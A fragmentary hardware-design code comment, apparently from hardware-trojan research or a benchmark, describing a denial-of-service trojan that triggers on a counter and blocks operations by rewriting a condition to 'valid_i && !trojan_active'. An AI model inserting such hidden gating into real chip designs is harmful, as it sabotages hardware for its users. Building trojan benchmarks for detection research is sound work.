 ...
 * 
 * Description:
 *   Disables operations by blocking valid_i control signal
 *   
 * Trigger: Counter on valid_i
 * Payload: Block valid_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block valid_i when trojan is active
//
// IMPORTANT: valid_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (valid_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: valid_i && 0 = 0 (always false)
//   All operations controlled by valid_i are blocked
